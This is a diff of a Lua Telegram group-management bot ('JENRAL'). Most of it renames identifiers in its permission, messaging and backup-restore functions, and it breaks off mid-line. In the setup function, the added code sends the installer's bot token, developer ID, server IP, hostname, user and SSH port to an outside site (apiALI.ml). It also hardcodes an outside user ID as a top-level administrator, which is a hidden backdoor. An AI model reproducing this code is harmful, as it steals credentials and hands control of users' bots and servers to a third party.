@@ -19,20 +19,20 @@ Ip      = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*
 Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
 Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
---     Source Jenral     --
+--     Source JENRAL     --
 local AutoSet = function() 
-if not DevALI:get(Server.."IdJenral") then 
+if not DevALI:get(Server.."IdJENRAL") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
-DevALI:set(Server.."IdJenral",DevId) 
+DevALI:set(Server.."IdJENRAL",DevId) 
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end 
-os.execute('lua Jenral.lua') 
+os.execute('lua JENRAL.lua') 
 end 
-if not DevALI:get(Server.."TokenJenral") then 
+if not DevALI:get(Server.."TokenJENRAL") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
 local TokenBot = io.read() 
 if TokenBot ~= '' then 
@@ -41,12 +41,12 @@ if res ~= 200 then
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 else 
 io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
-DevALI:set(Server.."TokenJenral",TokenBot) 
+DevALI:set(Server.."TokenJENRAL",TokenBot) 
 end  
 else 
 print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
 end  
-os.execute('lua Jenral.lua') 
+os.execute('lua JENRAL.lua') 
 end 
 local Create = function(data, file, uglify)  
 file = io.open(file, "w+")   
@@ -61,18 +61,18 @@ file:close()
 end
 local CreateConfigAuto = function()
 Config = {
-DevId = DevALI:get(Server.."IdJenral"),
-TokenBot = DevALI:get(Server.."TokenJenral"),
-Jenral = DevALI:get(Server.."TokenJenral"):match("(%d+)"),
-SudoIds = {DevALI:get(Server.."IdJenral")},
+DevId = DevALI:get(Server.."IdJENRAL"),
+TokenBot = DevALI:get(Server.."TokenJENRAL"),
+JENRAL = DevALI:get(Server.."TokenJENRAL"):match("(%d+)"),
+SudoIds = {DevALI:get(Server.."IdJENRAL")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiALI.ml/config.php?Get=Jenral&DevId="..DevALI:get(Server.."IdJenral").."&TokenBot="..DevALI:get(Server.."TokenJenral").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
-file = io.open("Jenral.sh", "w")  
+https.request("https://apiALI.ml/config.php?Get=JENRAL&DevId="..DevALI:get(Server.."IdJENRAL").."&TokenBot="..DevALI:get(Server.."TokenJENRAL").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
+file = io.open("JENRAL.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/Jenral
-token="]]..DevALI:get(Server.."TokenJenral")..[["
+cd $HOME/JENRAL
+token="]]..DevALI:get(Server.."TokenJENRAL")..[["
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -87,18 +87,18 @@ echo "~ The Token Was Not Found In The config.lua File!"
 echo "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉"
 exit 1
 fi
-./tg -s ./Jenral.lua -p PROFILE --bot=$token
+./tg -s ./JENRAL.lua -p PROFILE --bot=$token
 done
 ]])  
 file:close()  
 file = io.open("Run", "w")  
 file:write([[
 #!/usr/bin/env bash
-cd $HOME/Jenral
+cd $HOME/JENRAL
 while(true) do
 rm -fr ../.telegram-cli
-screen -S Jenral -X kill
-screen -S Jenral ./Jenral.sh
+screen -S JENRAL -X kill
+screen -S JENRAL ./JENRAL.sh
 done
 ]]) 
 file:close() 
@@ -107,34 +107,34 @@ os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
 end
-local Load_Jenral = function() 
+local Load_JENRAL = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
 AutoSet() 
 else 
 f:close() 
-DevALI:del(Server.."IdJenral");DevALI:del(Server.."TokenJenral")
+DevALI:del(Server.."IdJENRAL");DevALI:del(Server.."TokenJENRAL")
 end 
 local config = loadfile("./config.lua")() 
 return config 
 end  
-Load_Jenral() 
+Load_JENRAL() 
 print("\27[36m"..[[ 
 ---------------------------------------------
-GENRAL
+JENRAL
 |-------------------------------------------|
 |This Source Was Developed By (ALI) @QvQvQvQ.|
 |  This Is The Source Channel @GENRALTEAM .   |
-|               - Jenral -                 |
+|               - JENRAL -                 |
 ---------------------------------------------
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,218385683}
-Jenral = Config.Jenral
+SudoIds = {Config.SudoIds,1186878655}
+JENRAL = Config.JENRAL
 TokenBot = Config.TokenBot
-NameBot = (DevALI:get(Jenral..'ALI:NameBot') or 'الجنرال')
---     Source Jenral     --
+NameBot = (DevALI:get(JENRAL..'ALI:NameBot') or 'جنرال ')
+--     Source JENRAL     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..'\27[m'
 FilesNumber = 0
 for v in io.popen('ls Files'):lines() do
@@ -147,15 +147,15 @@ FilesPrint = FilesPrint.."\27[35m".."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
 if FilesNumber ~= 0 then
 print(FilesPrint)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --     Start Functions    --
 function vardump(value)
 print(serpent.block(value, {comment=false}))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function dl_cb(arg, data)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----------  Sudo  ----------
 function Sudo(msg) 
 local var = false 
@@ -179,176 +179,176 @@ var = true
 end 
 return var 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 -------  SecondSudo  -------
 function SecondSudo(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:SecondSudo:',msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:SecondSudo:',msg.sender_user_id_) 
 if Status or Sudo(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----------  Bot  -----------
 function Bot(msg) 
 local var = false  
-if msg.sender_user_id_ == tonumber(Jenral) then  
+if msg.sender_user_id_ == tonumber(JENRAL) then  
 var = true  
 end  
 return var  
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 ---------  SudoBot  --------
 function SudoBot(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:SudoBot:',msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:SudoBot:',msg.sender_user_id_) 
 if Status or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ---------Manager All--------
 function ManagerAll(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:ManagerAll:',msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:ManagerAll:',msg.sender_user_id_) 
 if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --------- Admin All --------
 function AdminAll(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:AdminAll:',msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:AdminAll:',msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ------ Vip Member All ------
 function VipAll(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:VipAll:',msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:VipAll:',msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----   ALIConstructor   ----
 function ALIConstructor(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:ALIConstructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:ALIConstructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----  BasicConstructor  ----
 function BasicConstructor(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ALIConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----    Constructor     ----
 function Constructor(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:Constructor:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ALIConstructor(msg) or BasicConstructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ---------  Manager  --------
 function Manager(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:Managers:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:Managers:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or ALIConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----------  Admin  ---------
 function Admin(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:Admins:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:Admins:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or ALIConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ---------Vip Member---------
 function VipMem(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:VipMem:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ManagerAll(msg) or AdminAll(msg) or VipAll(msg) or ALIConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Admin(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 --------- Cleaner ----------
 function Cleaner(msg) 
-local Status = DevALI:sismember(Jenral..'ALI:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
+local Status = DevALI:sismember(JENRAL..'ALI:Cleaner:'..msg.chat_id_,msg.sender_user_id_) 
 if Status or SudoBot(msg) or ALIConstructor(msg) or BasicConstructor(msg) or Constructor(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
 return true  
 else  
 return false  
 end  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ---------  Banned  ---------
 local function Ban(user_id, chat_id)
-if DevALI:sismember(Jenral..'ALI:Ban:'..chat_id, user_id) then
+if DevALI:sismember(JENRAL..'ALI:Ban:'..chat_id, user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ---------  BanAll  ---------
 function BanAll(user_id)
-if DevALI:sismember(Jenral..'ALI:BanAll:', user_id) then
+if DevALI:sismember(JENRAL..'ALI:BanAll:', user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ----------  Muted  ---------
 local function Muted(user_id, chat_id)
-if DevALI:sismember(Jenral..'ALI:Muted:'..chat_id, user_id) then
+if DevALI:sismember(JENRAL..'ALI:Muted:'..chat_id, user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source Jenral     --
+--     Source JENRAL     --
 ---------  MuteAll  --------
 function MuteAll(user_id)
-if DevALI:sismember(Jenral..'ALI:MuteAll:', user_id) then
+if DevALI:sismember(JENRAL..'ALI:MuteAll:', user_id) then
 var = true
 else
 var = false
 end
 return var
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function DeleteMessage(chatid ,mid)
 pcall(tdcli_function ({
 ID = "DeleteMessages",
@@ -357,24 +357,24 @@ message_ids_ = mid
 },function(arg,data) 
 end,nil))
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function send(chat_id, reply_to_message_id, text)
 local TextParseMode = {ID = "TextParseModeMarkdown"}
 pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
 end
---     Source Jenral     --
-function JenralFiles(msg)
+--     Source JENRAL     --
+function JENRALFiles(msg)
 for v in io.popen('ls Files'):lines() do
 if v:match(".lua$") then
 plugin = dofile("Files/"..v)
-if plugin.Jenral and msg then
-FilesText = plugin.Jenral(msg)
+if plugin.JENRAL and msg then
+FilesText = plugin.JENRAL(msg)
 end
 end
 end
 send(msg.chat_id_, msg.id_,FilesText)  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function download_to_file(url, file_path) 
 local respbody = {} 
 local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
@@ -391,10 +391,10 @@ file:write(table.concat(respbody))
 file:close() 
 return file_path, code 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 function AddFile(msg,chat,ID_FILE,File_Name)
 if File_Name:match('.json') then
-if File_Name:lower():match('(%d+)') ~= Jenral:lower() then 
+if File_Name:lower():match('(%d+)') ~= JENRAL:lower() then 
 send(chat,msg.id_,"⌁︙عذرا هذا الملف ليس تابع لهذا البوت")   
 return false 
 end
@@ -404,77 +404,77 @@ download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result
 else
 send(chat,msg.id_,"⌁︙عذرا الملف ليس بصيغة ↫ Json يرجى رفع الملف الصحيح")
 end
-local info_file = io.open('./'..Jenral..'.json', "r"):read('*a')
+local info_file = io.open('./'..JENRAL..'.json', "r"):read('*a')
 local JsonInfo = JSON.decode(info_file)
 vardump(JsonInfo)
-DevALI:set(Jenral.."ALI:NameBot",JsonInfo.BotName) 
+DevALI:set(JENRAL.."ALI:NameBot",JsonInfo.BotName) 
 for IdGps,v in pairs(JsonInfo.GroupsList) do
-DevALI:sadd(Jenral.."ALI:Groups",IdGps) 
-DevALI:set(Jenral.."ALI:Lock:Bots"..IdGps,"del") DevALI:hset(Jenral.."ALI:Spam:Group:User"..IdGps ,"Spam:User","keed") 
+DevALI:sadd(JENRAL.."ALI:Groups",IdGps) 
+DevALI:set(JENRAL.."ALI:Lock:Bots"..IdGps,"del") DevALI:hset(JENRAL.."ALI:Spam:Group:User"..IdGps ,"Spam:User","keed") 
 LockList ={'ALI:Lock:Links','ALI:Lock:Contact','ALI:Lock:Forwards','ALI:Lock:Videos','ALI:Lock:Gifs','ALI:Lock:EditMsgs','ALI:Lock:Stickers','ALI:Lock:Farsi','ALI:Lock:Spam','ALI:Lock:WebLinks','ALI:Lock:Photo'}
 for i,Lock in pairs(LockList) do
-DevALI:set(Jenral..Lock..IdGps,true)
+DevALI:set(JENRAL..Lock..IdGps,true)
 end
 if v.ALIConstructors then
 for k,IdALIConstructors in pairs(v.ALIConstructors) do
-DevALI:sadd(Jenral..'ALI:ALIConstructor:'..IdGps,IdALIConstructors)  
+DevALI:sadd(JENRAL..'ALI:ALIConstructor:'..IdGps,IdALIConstructors)  
 print('تم رفع منشئين المجموعات')
 end
 end
 if v.BasicConstructors then
 for k,IdBasicConstructors in pairs(v.BasicConstructors) do
-DevALI:sadd(Jenral..'ALI:BasicConstructor:'..IdGps,IdBasicConstructors)  
+DevALI:sadd(JENRAL..'ALI:BasicConstructor:'..IdGps,IdBasicConstructors)  
 print('تم رفع ( '..k..' ) منشئين اساسيين')
 end
 end
 if v.Constructors then
 for k,IdConstructors in pairs(v.Constructors) do
-DevALI:sadd(Jenral..'ALI:Constructor:'..IdGps,IdConstructors)  
+DevALI:sadd(JENRAL..'ALI:Constructor:'..IdGps,IdConstructors)  
 print('تم رفع ( '..k..' ) منشئين')
 end
 end
 if v.Managers then
 for k,IdManagers in pairs(v.Managers) do
-DevALI:sadd(Jenral..'ALI:Managers:'..IdGps,IdManagers)  
+DevALI:sadd(JENRAL..'ALI:Managers:'..IdGps,IdManagers)  
 print('تم رفع ( '..k..' ) مدراء')
 end
 end
 if v.Admins then
 for k,idmod in pairs(v.Admins) do
 vardump(IdAdmins)
-DevALI:sadd(Jenral..'ALI:Admins:'..IdGps,IdAdmins)  
+DevALI:sadd(JENRAL..'ALI:Admins:'..IdGps,IdAdmins)  
 print('تم رفع ( '..k..' ) ادمنيه')
 end
 end
 if v.Vips then
 for k,IdVips in pairs(v.Vips) do
-DevALI:sadd(Jenral..'ALI:VipMem:'..IdGps,IdVips)  
+DevALI:sadd(JENRAL..'ALI:VipMem:'..IdGps,IdVips)  
 print('تم رفع ( '..k..' ) مميزين')
 end
 end
 if v.LinkGroups then
 if v.LinkGroups ~= "" then
-DevALI:set(Jenral.."ALI:Groups:Links"..IdGps,v.LinkGroups)   
+DevALI:set(JENRAL.."ALI:Groups:Links"..IdGps,v.LinkGroups)   
 print('( تم وضع روابط المجموعات )')
 end
 end
 if v.Welcomes then
 if v.Welcomes ~= "" then
-DevALI:set(Jenral.."ALI:Groups:Welcomes"..IdGps,v.Welcomes)   
+DevALI:set(JENRAL.."ALI:Groups:Welcomes"..IdGps,v.Welcomes)   
 print('( تم وضع ترحيب المجموعات )')
 end
 end
 end
 send(chat,msg.id_,"⌁︙تم رفع النسخه بنجاح \n⌁︙تم تفعيل جميع المجموعات \n⌁︙تم استرجاع مشرفين المجموعات \n⌁︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function resolve_username(username,cb)
 tdcli_function ({
 ID = "SearchPublicChat",
 username_ = username
 }, cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function getInputFile(file)
 if file:match('/') then
 infile = {ID = "InputFileLocal", path_ = file}
@@ -485,7 +485,7 @@ infile = {ID = "InputFilePersistentId", persistent_id_ = file}
 end
 return infile
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function getChatId(id)
 local chat = {}
 local id = tostring(id)
@@ -498,15 +498,15 @@ chat = {ID = group_id, type = 'group'}
 end
 return chat
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function ChatLeave(chat_id, user_id)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function ChatKick(chat_id, user_id)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatusKicked" }, }, dl_cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function getParseMode(parse_mode)
 if parse_mode then
 local mode = parse_mode:lower()
@@ -518,7 +518,7 @@ end
 end
 return P
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function getMessage(chat_id, message_id,cb)
 tdcli_function ({
 ID = "GetMessage",
@@ -526,19 +526,19 @@ chat_id_ = chat_id,
 message_id_ = message_id
 }, cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
 tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
 tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function Dev_ALI(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
 local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function GetApi(web) 
 local info, res = https.request(web) 
 local req = json:decode(info) if res ~= 200 then 
@@ -549,7 +549,7 @@ return false
 end 
 return req 
 end 
---     Source Jenral     --
+--     Source JENRAL     --
 function SendText(chat_id, text, reply_to_message_id, markdown) 
 send_api = "https://api.telegram.org/bot"..TokenBot 
 local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
@@ -563,7 +563,7 @@ url = url.."&parse_mode=HTML"
 end 
 return GetApi(url) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function SendInline(chat_id,text,keyboard,inline,reply_id) 
 local response = {} 
 response.keyboard = keyboard 
@@ -577,9 +577,9 @@ send_api = send_api.."&reply_to_message_id="..reply_id
 end 
 return GetApi(send_api) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
---     Source Jenral     --
+--     Source JENRAL     --
 function Pin(channel_id, message_id, disable_notification) 
 tdcli_function ({ 
 ID = "PinChannelMessage", 
@@ -590,36 +590,36 @@ disable_notification_ = disable_notification
 vardump(data)
 end ,nil) 
 end
---     Source Jenral     --
-local ALIRank = function(msg) if SudoId(msg.sender_user_id_) then JenralTEAM  = "المطور" elseif SecondSudo(msg) then JenralTEAM = "المطور" elseif SudoBot(msg) then JenralTEAM = "المطور" elseif ManagerAll(msg) then JenralTEAM = "المدير" elseif AdminAll(msg) then JenralTEAM = "الادمن" elseif ALIConstructor(msg) then JenralTEAM = "المالك" elseif BasicConstructor(msg) then JenralTEAM = "المنشئ" elseif Constructor(msg) then JenralTEAM = "المنشئ" elseif Manager(msg) then JenralTEAM = "المدير" elseif Admin(msg) then JenralTEAM = "الادمن" else JenralTEAM = "العضو" end return JenralTEAM end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(218385683) then JenralTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(Jenral) then JenralTEAM = 'البوت' elseif SudoId(user_id) then JenralTEAM = 'المطور الاساسي' elseif DevALI:sismember(Jenral..'ALI:SecondSudo:', user_id) then JenralTEAM = 'المطور الثانوي' elseif DevALI:sismember(Jenral..'ALI:SudoBot:', user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:SudoBot:Rd"..chat_id) or 'المطور' elseif DevALI:sismember(Jenral..'ALI:ManagerAll:', user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:Managers:Rd"..chat_id) or 'المدير العام' elseif DevALI:sismember(Jenral..'ALI:AdminAll:', user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevALI:sismember(Jenral..'ALI:VipAll:', user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:VipMem:Rd"..chat_id) or 'المميز العام' elseif DevALI:sismember(Jenral..'ALI:ALIConstructor:'..chat_id, user_id) then JenralTEAM = 'المالك' elseif DevALI:sismember(Jenral..'ALI:BasicConstructor:'..chat_id, user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevALI:sismember(Jenral..'ALI:Constructor:'..chat_id, user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevALI:sismember(Jenral..'ALI:Managers:'..chat_id, user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:Managers:Rd"..chat_id) or 'المدير' elseif DevALI:sismember(Jenral..'ALI:Admins:'..chat_id, user_id) then JenralTEAM = DevALI:get(Jenral.."ALI:Admins:Rd"..chat_id) or 'الادمن' elseif DevALI:sismember(Jenral..'ALI:VipMem:'..chat_id, user_id) then  JenralTEAM = DevALI:get(Jenral.."ALI:VipMem:Rd"..chat_id) or 'المميز' elseif DevALI:sismember(Jenral..'ALI:Cleaner:'..chat_id, user_id) then  JenralTEAM = DevALI:get(Jenral.."ALI:Cleaner:Rd"..chat_id) or 'المنظف' else JenralTEAM = DevALI:get(Jenral.."ALI:mem:Rd"..chat_id) or 'العضو' end return JenralTEAM end
---     Source Jenral     --
+--     Source JENRAL     --
+local ALIRank = function(msg) if SudoId(msg.sender_user_id_) then JENRALTEAM  = "المطور" elseif SecondSudo(msg) then JENRALTEAM = "المطور" elseif SudoBot(msg) then JENRALTEAM = "المطور" elseif ManagerAll(msg) then JENRALTEAM = "المدير" elseif AdminAll(msg) then JENRALTEAM = "الادمن" elseif ALIConstructor(msg) then JENRALTEAM = "المالك" elseif BasicConstructor(msg) then JENRALTEAM = "المنشئ" elseif Constructor(msg) then JENRALTEAM = "المنشئ" elseif Manager(msg) then JENRALTEAM = "المدير" elseif Admin(msg) then JENRALTEAM = "الادمن" else JENRALTEAM = "العضو" end return JENRALTEAM end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1186878655) then JENRALTEAM = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(JENRAL) then JENRALTEAM = 'البوت' elseif SudoId(user_id) then JENRALTEAM = 'المطور الاساسي' elseif DevALI:sismember(JENRAL..'ALI:SecondSudo:', user_id) then JENRALTEAM = 'المطور الثانوي' elseif DevALI:sismember(JENRAL..'ALI:SudoBot:', user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:SudoBot:Rd"..chat_id) or 'المطور' elseif DevALI:sismember(JENRAL..'ALI:ManagerAll:', user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:Managers:Rd"..chat_id) or 'المدير العام' elseif DevALI:sismember(JENRAL..'ALI:AdminAll:', user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:Admins:Rd"..chat_id) or 'الادمن العام' elseif DevALI:sismember(JENRAL..'ALI:VipAll:', user_id) then JENRALTEAM = DevALI:get(JENRAL.."ALI:VipMem:Rd"..chat_id) or 'المميز العام' elseif 